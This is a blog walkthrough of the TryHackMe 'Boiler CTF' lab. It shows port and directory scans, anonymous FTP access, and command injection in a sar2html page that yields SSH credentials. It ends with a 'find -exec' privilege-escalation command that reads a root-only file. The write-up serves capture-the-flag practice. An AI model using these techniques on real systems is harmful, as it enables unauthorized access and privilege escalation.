---
layout: post
title: Boiler CTF
categories: THM
---

Intermediate level CTF is created by [MrSeth6797](https://tryhackme.com/p/MrSeth6797) and is a free [room](https://tryhackme.com/room/boilerctf2).

"Intermediate level CTF. Just enumerate, you'll get there."

## Reconnaissance

First let's start with scanning the machine. Remember that by default, NMAP will only scan the most common 1000 ports!

```
$ nmap -sC -sV -p- 10.10.36.182
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-20 07:55 EDT
Nmap scan report for 10.10.36.182
Host is up (0.037s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.1.59
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp    open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
10000/tcp open  http    MiniServ 1.930 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
55007/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e3:ab:e1:39:2d:95:eb:13:55:16:d6:ce:8d:f9:11:e5 (RSA)
|   256 ae:de:f2:bb:b7:8a:00:70:20:74:56:76:25:c0:df:38 (ECDSA)
|_  256 25:25:83:f2:a7:75:8a:a0:46:b2:12:70:04:68:5c:cb (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

We can start answering a couple of questions now... it's time to explore now!

Let's start with the FTP port... there might be something interesting there after all.

```
$ ftp 10.10.36.182  
Connected to 10.10.36.182.
220 (vsFTPd 3.0.3)
Name (10.10.36.182:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> pwd
Remote directory: /
ftp> ls -la
229 Entering Extended Passive Mode (|||45138|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 .
drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 ..
-rw-r--r--    1 ftp      ftp            74 Aug 21  2019 .info.txt
226 Directory send OK.
```
Looks like there might be something there after all.

```
$ cat .info.txt            
Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl!
```

This looks like a simple caesar substitution cipher... Oh yeah it is :')

```
Just wanted to see if you find it. Lol. Remember: Enumeration is the key!
```

Okay then. Let's go!

PS: Remember to continue answering the questions.

## Directory discovery
Directory discovery can tell much about how the developers create the web server and the page, especially when they have to maintain it.

One thing that comes to attention is the `robots.txt` file that came with the nmap scan and looks like a bluff - perhaps some more disdirection...

Now, let's launch a directory discovery tool, also know as an enumeration tool like [Dirbuster](https://www.kali.org/tools/dirbuster/), [Dirb](https://www.kali.org/tools/dirb/) or [Gobuster](https://www.kali.org/tools/gobuster/)!

```
$ dirb http://10.10.36.182

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Mar 20 07:52:32 2022
URL_BASE: http://10.10.36.182/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.36.182/ ----
+ http://10.10.36.182/index.html (CODE:200|SIZE:11321)                                                         
==> DIRECTORY: http://10.10.36.182/joomla/                                                                     
==> DIRECTORY: http://10.10.36.182/manual/                                                                     
+ http://10.10.36.182/robots.txt (CODE:200|SIZE:257)                                                           
+ http://10.10.36.182/server-status (CODE:403|SIZE:300)                                                        
                                                                                                               
---- Entering directory: http://10.10.36.182/joomla/ ----
==> DIRECTORY: http://10.10.36.182/joomla/_archive/                                                            
==> DIRECTORY: http://10.10.36.182/joomla/_database/                                                           
==> DIRECTORY: http://10.10.36.182/joomla/_files/                                                              
==> DIRECTORY: http://10.10.36.182/joomla/_test/                                                               
==> DIRECTORY: http://10.10.36.182/joomla/~www/                                                                
==> DIRECTORY: http://10.10.36.182/joomla/administrator/                                                       
==> DIRECTORY: http://10.10.36.182/joomla/bin/                                                                 
==> DIRECTORY: http://10.10.36.182/joomla/build/                                                               
==> DIRECTORY: http://10.10.36.182/joomla/cache/                                                               
==> DIRECTORY: http://10.10.36.182/joomla/components/                                                          
==> DIRECTORY: http://10.10.36.182/joomla/images/                                                              
==> DIRECTORY: http://10.10.36.182/joomla/includes/                                                            
+ http://10.10.36.182/joomla/index.php (CODE:200|SIZE:12478)                                                   
==> DIRECTORY: http://10.10.36.182/joomla/installation/                                                        
==> DIRECTORY: http://10.10.36.182/joomla/language/                                                            
==> DIRECTORY: http://10.10.36.182/joomla/layouts/                                                             
==> DIRECTORY: http://10.10.36.182/joomla/libraries/                                                           
==> DIRECTORY: http://10.10.36.182/joomla/media/                                                               
==> DIRECTORY: http://10.10.36.182/joomla/modules/                                                             
==> DIRECTORY: http://10.10.36.182/joomla/plugins/                                                             
==> DIRECTORY: http://10.10.36.182/joomla/templates/                                                           
==> DIRECTORY: http://10.10.36.182/joomla/tests/                                                               
==> DIRECTORY: http://10.10.36.182/joomla/tmp/ 
```

There are a lot of directories in here, so get cracking.

Looks like they all look the same, but the third discovered directory does give us something slightly different. Yes, still, it must be decoded but... again, nothing worth to help with the challenge.

The next directory though, is not a white page with some ciphered string but something called "COLLECTING SAR DATA", called "sar2html" on the left side bar.

A good idea is to explore the page... It looks like creating a "New" report adds some parameters into the URL, so how about LFI or even remote code execution?

Making a couple of tests (and some old knowledge), we find out that we can execute commands by entering a semicolon (`;`) after the equal sign (`=`).

Testing a handful we find an interesting file in the directory... `log.txt`! I wonder what is in there ;)

## Compromise the machine

Opening the "Select Host" drop down, we can find the content of the file and we get a username:password credentials that we might be able to use in that high ssh port.

```
$ ssh basterd@10.10.36.182 -p 55007
The authenticity of host '[10.10.36.182]:55007 ([10.10.36.182]:55007)' can't be established.
ED25519 key fingerprint is SHA256:GhS3mY+uTmthQeOzwxRCFZHv1MN2hrYkdao9HJvi8lk.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.36.182]:55007' (ED25519) to the list of known hosts.
basterd@10.10.36.182's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

8 packages can be updated.
8 updates are security updates.


Last login: Thu Aug 22 12:29:45 2019 from 192.168.1.199
$
```

There is a file called `backup.sh` in the home directory, and opening it gives us some more credentials. Huh, I guess being mislead a handful of times (trolled really) does pay off at the end.

## Privilege Escalation

```
$ su stoner
Password: 
stoner@Vulnerable:/home/basterd$ cd
stoner@Vulnerable:~$ ls -la
total 16
drwxr-x--- 3 stoner stoner 4096 Aug 22  2019 .
drwxr-xr-x 4 root   root   4096 Aug 22  2019 ..
drwxrwxr-x 2 stoner stoner 4096 Aug 22  2019 .nano
-rw-r--r-- 1 stoner stoner   34 Aug 21  2019 .secret
stoner@Vulnerable:~$ cat .secret
You made .. ... ...., ... .....
stoner@Vulnerable:~$ sudo -l 
User stoner may run the following commands on Vulnerable:
    (root) NOPASSWD: /NotThisTime/MessinWithYa
stoner@Vulnerable:~$
```
Looks like the author is really into doing a lot to troll our way around the machine ^.^

Let's take a look at [GTFOBins](https://gtfobins.github.io), see if there is something there that is worth trying out.

I looked into the different options to spawn a shell and came up empty until I took a look at the `find` command, which allowed me to execute the `cat` command on the `root.txt` file!

```
stoner@Vulnerable:~$ find . -exec cat /root/root.txt \;
It ....'. .... ...., ... ..?
It ....'. .... ...., ... ..?
It ....'. .... ...., ... ..?
```

Success!

